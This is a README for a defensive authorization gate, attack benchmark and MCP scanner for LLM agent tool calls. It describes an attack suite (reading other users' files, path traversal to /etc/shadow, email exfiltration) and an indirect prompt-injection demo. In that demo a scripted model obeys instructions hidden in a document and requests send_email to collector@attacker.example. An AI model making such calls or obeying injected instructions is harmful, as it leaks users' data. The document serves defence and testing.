# agent-tool-authz

[![ci](https://github.com/gl1tchdust/agent-tool-authz/actions/workflows/ci.yml/badge.svg)](https://github.com/gl1tchdust/agent-tool-authz/actions/workflows/ci.yml)

Authorization for LLM agent tool calls: a detector that maps a server's
authorization surface, a gate that enforces a policy over it, and the attack
suite that measures whether the gate works.

An agent with tools is an API whose caller can be talked into anything. The
bug classes are the ones API testers already know, one layer up:
[OWASP LLM06:2025 Excessive Agency](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/)
is BOLA and BFLA with a persuadable client.

```
attacks            11          legitimate calls    4
  work unguarded   11            broken            0
  blocked          11            breakage rate  0.000
  block rate    1.000
```

Both numbers, always. A block rate on its own is unfalsifiable, and
"deny everything" scores a perfect one.

## The argument

You cannot patch prompt injection out of a model. Every mitigation that tries
is a filter on text, and text is the attacker's medium. So the control has to
live where it has always lived for APIs: at the authorization boundary, which
does not trust the caller.

For an agent, **the model is the untrusted caller**. Not malicious and not
broken, untrusted in the ordinary sense: its output is shaped by data it read,
some of which an attacker wrote. What it asks for cannot be the basis of the
decision to allow it, for exactly the reason an API does not authorize a
request by reading a field in the request body.

This has a consequence worth stating plainly, because it is what makes the
approach work: **the gate does not try to detect prompt injection.** It cannot,
and a tool that claims to is measuring the wrong thing. `send_email(to=attacker)`
is byte-identical whether a user asked for it or a poisoned document did. The
decidable question is whether this principal may send mail to that address at
all, and that question has an answer that does not depend on guessing the
model's state.

## 60-second quickstart

```bash
git clone https://github.com/gl1tchdust/agent-tool-authz
cd agent-tool-authz
pip install -r requirements.txt

python -m benchmark.run              # score the policy against the attacks
python scripts/injection_demo.py     # indirect injection, end to end
python -m pytest tests/ -q           # 126 tests
```

No model, no API key, no network. The question "would this call be permitted"
is decided by the policy alone, which is what makes it testable in CI at all.

## What a policy looks like

```yaml
default: deny

rules:
  - id: read-own-files
    tools: [read_file]
    roles: [user]
    arguments:
      path: { under_path: "/home/{principal.id}" }

  - id: email-internal-only
    tools: [send_email]
    roles: [user]
    arguments:
      to: { matches: "[^@]+@corp\\.example" }
```

Two things are doing the work.

**Constraints are on arguments, not just tool names.** "May this principal call
`read_file`" is the function-level question, and answering only that is how
every user of an application ends up sharing one grant. "May this principal
call `read_file` with *this path*" is the object-level question, and it is the
one that stops the attack.

**`{principal.id}` interpolates.** One rule means "your own files", for
everybody, without a rule per user. That is the whole reason argument-level
authorization is maintainable rather than a combinatorial mess.

The second rule is the one that survives prompt injection. The agent can be
persuaded to compose anything; it still cannot address it outside the company.

## The attack suite

Fifteen cases in `attacks/cases.yml`, each a tool call an attacker wants the
agent to make. Eleven are attacks; four are legitimate traffic that must keep
working.

| Case | Class | What it tries |
|---|---|---|
| AUTHZ-01 | CWE-639 | Read another user's file |
| AUTHZ-02 | CWE-639 | Overwrite another user's file |
| AUTHZ-03 | CWE-22 | Escape the home directory with `..` |
| AUTHZ-04 | CWE-22 | Reach `/etc/shadow` |
| AUTHZ-05 | CWE-862 | Call an admin-only tool as a user |
| AUTHZ-06 | CWE-862 | Enumerate all accounts |
| AUTHZ-07 | CWE-306 | Act with no principal at all |
| AUTHZ-08 | CWE-200 | Exfiltrate by email to an outside address |
| AUTHZ-10 | CWE-862 | Omit the argument the policy constrains |
| AUTHZ-11 | CWE-639 | Delete someone else's file |
| AUTHZ-12 | CWE-862 | Call a tool the policy never mentions |

Every case runs twice: once through a gate with no policy, to establish the
attack works at all, and once through the policy under test. A case that fails
unguarded is measuring nothing, and CI fails if one appears.

### The four cases that are not attacks

`AUTHZ-09`, `13`, `14` and `15` are ordinary work: read your own file, mail a
colleague, let an admin do admin things. They invert the test, and they are
the reason the block rate means anything.

This is not theoretical. The first run of this suite scored **1.000 against a
policy that denied all file access**, because a guard rule written as
`not_equals: ""` matched every non-empty path. Eleven attacks blocked, product
completely unusable, perfect score. The breakage cases caught it; nothing else
would have.

## Indirect prompt injection, end to end

```
turn 1: model requests read_file(path='/home/alice/comp-review.txt'...)
         gate: ALLOWED  a user may read files under their own home directory
turn 2: model requests send_email(to='collector@attacker.example'...)
         gate: DENIED   no rule grants 'alice' the call send_email(...)

tools executed: 1  (read_file)
data exfiltrated: no
```

The user asked for a summary. The document contained instructions addressed to
the model, inside an HTML comment, invisible in any rendered view. The model
complied. The system did not.

**The model in that run is scripted, and the output says so.** That is
deliberate, and it is the stronger choice:

- It tests the right thing. The gate's design assumption is that the model can
  be persuaded. Testing against a model that resists today measures the model,
  and silently stops testing anything the moment a more compliant version
  ships.
- Whether a given string persuades a given model is not a durable fact. It
  changes per model, per version, per phrasing. A security argument built on it
  needs re-running forever and has no answer in between.

`--live` runs the same scenario against a real model if you have an API key.
Treat the result as an anecdote. A refusal is a good outcome and is not a
control: a defence that holds only while the model keeps refusing is a hope
with a dependency on someone else's release schedule.

## The detector: what is this server's authorization surface?

> The full method, results and the four bugs the real corpus found in this
> detector are written up in **[RESEARCH.md](RESEARCH.md)**.

A gate needs a policy, and a policy needs to know what the server exposes.
`detector/mcp_authz_scan.py` reads a Python MCP server and answers three
questions about every tool:

    1. What does it accept?   parameters, and which are resource identifiers
    2. What does it do?       reads, writes, subprocess, network
    3. What does it claim?    the MCP annotations it declares

and then the one that matters: **do 2 and 3 agree?**

```bash
./detector/fetch_corpus.sh
python -m detector.mcp_authz_scan .corpus/mcp-servers/src/git
python -m detector.measure            # re-derive the accuracy below
```

### Why the third question is worth asking

MCP tools declare their own risk profile, and clients use those declarations
to decide what to auto-approve without asking a human. The specification is
explicit that this is a trust problem: clients "MUST consider tool annotations
to be untrusted unless they come from trusted servers"
([MCP 2026-07-28, Server Tools](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)).

That is correct advice with nothing behind it. "Only trust annotations from
servers you trust" hands the decision to an operator with no way to check. A
tool annotated `readOnlyHint: true` whose handler writes to disk is a false
statement in a manifest an agent is using to skip a confirmation prompt, and
it is decidable by reading the code.

### Measured accuracy

Scored against 289 tools in four real codebases, with every finding verified
by reading the source and every known miss recorded in
[`detector/labels/mcp-corpus.yml`](detector/labels/mcp-corpus.yml):

| | |
|---|---|
| Tools scanned | 289 |
| Findings | 5 |
| True positives | 4 |
| False positives | 1 |
| Known misses | 2 |
| **Precision** | **0.800** |
| **Recall** | **0.667** |

The true positives are three tools that reach the network with no annotations
at all, including one that sends an actual SMS through a third-party API and
one that fetches a caller-supplied URL. The false positive is the official git
server's `commit`, flagged because it unlinks `.git/MERGE_HEAD` after a merge:
that is internal plumbing, `destructive_hint=False` is correct, and the
scanner is wrong.

**That false positive is left unfixed on purpose.** Narrowing the rule until
it disappears would be fitting to one example, and a published 0.800 that
anyone can re-derive is worth more than a 1.000 that was tuned into existence.

### Measured at scale

Four codebases is not a population, so [`census/`](census/) runs the same
detector over the whole official MCP registry: 28,028 records, 3,310
repositories, 2,703 resolved, **14,138 tools in two languages**.

| | Python | TypeScript / JS |
|---|---|---|
| Repositories with tools | 218 | 659 |
| Tools | 4,663 | 9,475 |
| **Declaring any annotation, per tool** | **34.9%** | **32.1%** |
| Declaring any annotation, per repository | 38.1% | 42.3% |

Two rates per language, because the pooled figure is lower than the
per-project figure in both: **large projects annotate less than small ones**,
and the top ten repositories hold 44.9% of all Python tools. One of them,
Klavis-AI/klavis, is a monorepo of roughly 50 servers and 954 tools on its
own. Neither rate alone is the number.

That rate is a census and needs no human judgement, only a parse. It also
corrected the number this project first published: measured on SDK and FastMCP
examples the rate looked like 8.7%, and I argued that was an upper bound
because reference code is better maintained. It was a floor. Examples strip
annotations out to stay readable, so they are among the least annotated code
in the ecosystem.

Precision on the census is **estimated** from a seeded random sample of 12
findings read by hand, at 0.833 with a wide interval, and deliberately not
inherited from the 0.800 above. The breakdown matters more than the figure:
`undeclared-risk` scored 10 of 10 while both high-severity kinds were wrong in
every case examined. [`RESEARCH.md`](RESEARCH.md) explains why the cheap
structural check holds and the interesting semantic ones do not.

### TypeScript

Most MCP servers are not Python. [`detector/typescript.py`](detector/typescript.py)
reads annotations out of TypeScript and JavaScript with tree-sitter:

```bash
pip install "tree-sitter>=0.23,<0.25" tree-sitter-typescript==0.23.2
python -m detector.typescript path/to/server/src
```

Against the official TypeScript servers it finds **49 tools, 49 annotated**.
Recall is asserted in CI against an independent count of `.registerTool(` call
sites, because a parser that quietly skipped half the registrations would
report a confident rate over the half it read.

That 1.000 against 8.7% on the Python reference corpus is not a language
difference. The Python corpus is SDK and FastMCP *examples*, which strip
annotations to stay readable. These are working servers.

**Declarations only.** It does not analyse behaviour, so it reports no
contradictions. Of the four finding kinds, the structural one scored 10 of 10
and the two interesting ones scored 0 of 4, so porting the comparison would
have doubled the wrong answers along with the coverage.

It reads both shapes: `registerTool`-style calls and the low-level
`ListToolsRequestSchema` handler that returns tool definitions as an array.
Adding the second recovered 456 tools in 44 repositories that had reported
none, and because those are only 13.8% annotated it moved the TypeScript rate
down from 33.0% to 32.1%. The Python reader carries the same fix for
`@server.list_tools()`, worth 856 tools and 4.3 points.

### What it refuses to claim

Not that a server is vulnerable. Most MCP servers are single-user local tools
where a caller-supplied path is the entire product, and scoping it would break
them. The official reference servers are in this corpus and none of them is
reported as insecure, because they are not.

So the output is an inventory with evidence. It says "this tool takes a path
from the caller and opens it, with no allowlist check" and leaves "is that
acceptable here?" to whoever knows if the server is local or exposed. The only
assertion it makes is the declared-versus-actual mismatch, because that is a
contradiction inside the server's own manifest and holds however it is
deployed.

### Four bugs the real corpus found in the detector

Each of these produced confident wrong answers against real code, and each is
now a regression test.

| Bug | Symptom | Fix |
|---|---|---|
| Bare `.get()` treated as a network call | `token.claims.get("sub")` flagged; 20 false positives across the SDK examples | Match HTTP verbs only when the receiver is an imported module |
| Attribute calls resolved to module functions | `repo.commit()` followed into the `commit` *tool handler*, inheriting its file deletions | Follow only plain `helper()` calls, never `obj.helper()` |
| Handlers analysed in isolation | A git server with add, commit and reset reported `mutate state: 0`, because real handlers are one-line delegates | Follow module-local helpers, bounded at three levels |
| Every write treated as destructive | `commit` reported for `destructive_hint=False`, which is correct: MCP distinguishes destructive from additive | Separate destroyers from writers |

The second is the one worth dwelling on. It did not produce a near-miss; it
produced a HIGH-severity finding against a read-only tool, with a plausible
explanation attached. A scanner that is confidently wrong is worse than one
that is quiet, and the only reason it was caught is that `git show` being
"destructive" was obviously absurd to a human who knew git.

### Prior art, and why this is not it

The MCP scanner space is not empty. Snyk, NVIDIA SkillSpector, Tencent's
AI-Infra-Guard, `mcp-watch` and `ramparts` all ship. They answer a different
question: *is this server malicious?* Tool poisoning, prompt injection in
descriptions, credential leakage, supply chain.

None of them checks whether a handler's behaviour matches what it declares.
`ramparts` says so in its own README: it analyses "static metadata,
configurations, and skill files" rather than server code. `mcp-watch` has an
`access-control` category whose implementation is a regex for consent-fatigue
wording (`approve.*loop`, `confirm.*many`).

That gap is where this sits, and it is the same gap one layer down:
authorization is application-specific, so no vendor ships a rule for it.

## MCP

`src/mcp_proxy.py` sits between an MCP client and server and authorizes every
`tools/call` before forwarding it.

It exists because of what MCP's own specification says its authorization is
for. From the 2026-07-28 spec: the protocol "provides authorization
capabilities at the transport level, enabling MCP clients to make requests to
restricted MCP servers on behalf of resource owners."

That answers *may this client connect to this server*. It does not answer *may
this principal invoke this tool with these arguments*, and the second question
is the one that decides whether one user reads another's data. Two further
gaps follow from the spec as written:

- Authorization is **OPTIONAL**. A server may implement none of it.
- **STDIO transports are told not to use it**, and to take credentials from the
  environment instead. Most locally-run MCP servers are STDIO, so the only
  identity in play is the OS user who started the process, shared by every
  caller of the agent.

To be fair to the spec: it is not naive about OAuth. It covers token audience
binding, mix-up attacks, and names the confused deputy problem directly. The
gap is not "MCP has no auth". It is that **MCP authorizes the connection, not
the call.**

The proxy also filters `tools/list` to hide tools a principal could never
call. That is defence in depth and not a control: a tool the model never sees
is one it cannot be talked into calling, but a client is free to call a name it
was never shown, so the gate still evaluates every call. There is a test named
after exactly that.

## Design decisions worth arguing with

**Deny by default, with no option to change it.** There is no allow-by-default
mode, and `default: allow` is a load error rather than a setting. A gate whose
default is allow is not a gate, and offering the option invites someone to
reach for it the first time a policy is inconvenient.

**Denials return a message, not an exception.** An agent loop that crashes on
the first refusal is one users route around, and a gate people route around
protects nothing. Strict mode exists for batch contexts.

**The denial message is not an oracle.** It says the action was refused and
nothing about which rule or which argument. A client that learns why can map
the policy by probing, one call at a time.

**Unknown operators fail at load.** A mistyped `startswith` that was ignored
would silently drop a constraint and widen the rule. That is the worst
available outcome, so it is a hard error with the valid names listed.

**A constraint on an absent argument does not match.** Otherwise a call slips
the constraint by omitting the field, which `AUTHZ-10` exists to catch.

**`under_path` resolves before comparing.** The obvious way to express "inside
this directory" is a string prefix, and a string prefix permits
`/home/alice/../bob/secret`. `AUTHZ-03`.

## Limitations

- **Policies are per-deployment.** The shipped one is an example for the demo
  scenario. Nobody can write your tenancy rules for you, which is the same
  reason no vendor ships a rule that finds BOLA in your API.
- **No multi-step reasoning about intent.** The gate judges one call at a time.
  An attack built from individually-permitted calls is out of scope, and that
  is a real gap rather than a dismissal.
- **No data-flow tracking.** It does not know that the body of an email came
  from a file the principal could read. Constrain the sink.
- **The benchmark measures the policy, not a model.** It answers "would this
  call execute", which is the durable question. It says nothing about how
  often a model emits the call, which is the model's property and changes
  weekly.
- **No AgentDojo scoring yet.** Wiring the gate into
  [AgentDojo](https://github.com/ethz-spylab/agentdojo) as a pipeline defence
  would give numbers comparable to published research. Tracked as an issue.

## Layout

```
src/normalize.py            one tool-call shape; Anthropic, OpenAI, MCP adapters
src/policy.py               the policy model and its operators
src/gate.py                 the enforcement point, plus the control arm
src/mcp_proxy.py            authorizing proxy for MCP tools/call

detector/mcp_authz_scan.py  maps a server's authorization surface
detector/measure.py         re-derives precision and recall from the labels
detector/labels/            hand-labelled ground truth, with every verdict
detector/fetch_corpus.sh    pins the four scanned codebases

attacks/cases.yml           the attack suite, and the legitimate traffic
attacks/policy.yml          the example policy under test
benchmark/run.py            scores a policy, both halves
scripts/injection_demo.py   indirect injection, end to end
tests/                      126 tests
```

## How the three parts fit

```
detector  ->  policy scaffold  ->  human adds constraints  ->  gate enforces
                                                           ->  attacks score it
```

The scaffold is deny-by-default with every generated rule commented out, so it
grants nothing until somebody reads it. That is deliberate: a generated policy
that worked out of the box would be the worst artefact here, looking like
coverage while enforcing whatever the generator guessed. There is a test named
after exactly that property.

## Related

The same argument, one layer down:
[api-authz-testing-playbook](https://github.com/gl1tchdust/api-authz-testing-playbook)
tests BOLA and BFLA in APIs by replaying each request as owner, peer and
anonymous.
[devsecops-pipeline-lab](https://github.com/gl1tchdust/devsecops-pipeline-lab)
finds the same bug classes statically, with measured precision deciding which
rules may fail a build.

## License

MIT. See [LICENSE](LICENSE).

Shivam Mahajan, https://linkedin.com/in/shivam-mahajan-a8005a205
